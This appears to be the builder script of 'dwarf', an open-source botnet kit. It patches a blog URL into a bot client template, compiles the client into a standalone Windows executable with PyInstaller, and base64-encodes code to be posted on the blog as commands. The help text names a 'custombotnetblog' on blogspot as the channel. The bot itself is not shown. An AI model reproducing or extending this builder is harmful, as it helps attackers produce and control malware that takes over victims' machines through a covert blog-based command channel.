import argparse
from termcolor import colored
from colorama import init
import PyInstaller.__main__
import sys
import base64

init(autoreset=True)

def banner():
    return colored("""
         _                     __ 
        | |                   / _|       ||     
      __| |_      ____ _ _ __| |_    //\_||_)\  
     / _` \ \ /\ / / _` | '__|  _|  ||   \/  #| 
    | (_| |\ V  V / (_| | |  | |    ||  _/\_  | 
     \__,_| \_/\_/ \__,_|_|  |_|    \\\ / \/ )/ 
                                      `
Author: @dsecbx
Version: 1.0.0
Bugs: https://github.com/davidsonmizael/dwarf/issues
""", 'yellow', attrs=['bold'])

help_msg='''
    -b, --build      - Flag to run a build.
    -o, --output     - Name of the output file.
    -u, --blog-url   - Url of the blog that will be used.
Examples:
    python3 run.py --build --output "dwarf" --blog-url mycustombotnetblog.blogspot.com
    \tpython3 run.py -b -o "dwarf" -u mycustombotnetblog.blogspot.com
    
    python3 run.py --generate_post "code.py"
'''

parser = argparse.ArgumentParser(add_help=False, usage=help_msg)
parser.add_argument('--build', '-b', action="store_true", help="builds the client")
parser.add_argument('--output', '-o', type=str, default="dwarf", dest="output_name", help="name of the client file")
parser.add_argument('--blog-url', '-u', type=str, dest="blog_url", help="url of the blog")
parser.add_argument('--generate_post', type=str, dest="code_path", help="path of the code to be converted to base64")

args = parser.parse_args()

if __name__ == "__main__":
    print(banner())
    if(args.build is False and args.code_path is None):
        parser.print_usage()
        parser.exit()

    if(args.build):
        if(args.blog_url is None):
            print("[!] Missing blog url!")
            parser.print_help()
            parser.exit()
        
        url = args.blog_url
        if('http' not in url):
            url = 'https://' + url
        if(url[-1] == '/'):
            url = url[:-1]

        print(url)
        fin = open("bot.py", "rt")
        code = fin.read()
        ncode = code.replace('{BLOG_URL}', url)
        fin.close()
        fin = open("bot.py", "wt")
        fin.write(ncode)
        fin.close()
        #pyinstaller -F --hidden-import=win32timezone bot.py -n dwarf
        PyInstaller.__main__.run([
            'bot.py',
            '--onefile',
            '--hidden-import=win32timezone',
            '--name='+ args.output_name.split('.exe')[0]])

        print("\n[!] Executable file created at dist/" + args.output_name + ".exe")

        fin = open("bot.py", "wt")
        fin.write(code)
        fin.close()
        sys.exit()

    if(args.code_path):
        with open(args.code_path, "r") as f:
            print("[!] The code has been compiled to: \n" + base64.b64encode(f.read().encode('utf-8')).decode('ascii'))